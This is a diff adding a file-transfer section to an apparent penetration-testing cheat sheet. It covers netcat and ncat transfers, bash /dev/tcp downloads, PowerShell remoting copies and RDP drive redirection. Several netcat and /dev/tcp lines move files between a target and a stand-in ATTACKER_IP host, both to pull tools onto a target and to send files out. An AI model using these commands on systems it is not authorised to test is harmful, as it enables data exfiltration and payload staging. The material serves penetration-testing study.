@@ -311,3 +311,140 @@ Perl      → perl -e '...'
 Windows JS → cscript.exe /nologo wget.js URL OUTFILE
 Windows VBS → cscript.exe /nologo wget.vbs URL OUTFILE
 ```
+
+# Miscellaneous File Transfer Methods
+
+## Netcat / Ncat
+
+### Target listens → Attacker sends
+
+```bash
+# Target - receive file
+nc -l -p 8000 > file
+
+# Ncat
+ncat -l -p 8000 --recv-only > file
+```
+
+```bash
+# Attacker - send file
+nc -q 0 TARGET_IP 8000 < file
+
+# Ncat
+ncat --send-only TARGET_IP 8000 < file
+```
+
+### Attacker listens → Target connects
+
+```bash
+# Attacker
+sudo nc -l -p 443 -q 0 < file
+
+# Target
+nc ATTACKER_IP 443 > file
+```
+
+```bash
+# Attacker - Ncat
+sudo ncat -l -p 443 --send-only < file
+
+# Target
+ncat ATTACKER_IP 443 --recv-only > file
+```
+
+### Bash `/dev/tcp`
+
+```bash
+# Attacker
+sudo nc -l -p 443 -q 0 < file
+
+# Target
+cat < /dev/tcp/ATTACKER_IP/443 > file
+```
+
+### Reverse direction
+
+```bash
+# Target
+nc -q 0 ATTACKER_IP 8000 < file
+
+# Attacker
+nc -l -p 8000 > file
+```
+
+---
+
+## PowerShell Remoting / WinRM
+
+### Check WinRM
+
+```powershell
+Test-NetConnection -ComputerName TARGET -Port 5985
+```
+
+### Create session
+
+```powershell
+$Session = New-PSSession -ComputerName TARGET
+```
+
+### Local → Remote
+
+```powershell
+Copy-Item -Path C:\file.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+```
+
+### Remote → Local
+
+```powershell
+Copy-Item -Path C:\Users\Administrator\Desktop\file.txt -FromSession $Session -Destination C:\
+```
+
+### WinRM ports
+
+```text
+5985/tcp = HTTP
+5986/tcp = HTTPS
+```
+
+---
+
+## RDP File Transfer
+
+### rdesktop - mount local Linux directory
+
+```bash
+rdesktop TARGET_IP -d DOMAIN -u USER -p 'PASSWORD' \
+-r disk:linux='/home/user/share'
+```
+
+### xfreerdp - mount local Linux directory
+
+```bash
+xfreerdp /v:TARGET_IP /d:DOMAIN /u:USER /p:'PASSWORD' \
+/drive:linux,/home/user/share
+```
+
+### Access mounted directory from Windows RDP session
+
+```text
+\\tsclient\linux
+```
+
+### Native Windows RDP client
+
+```cmd
+mstsc
+```
+
+Use:
+
+```text
+Local Resources → More... → Drives
+```
+
+Then access the redirected drive in the RDP session through:
+
+```text
+\\tsclient\
+```
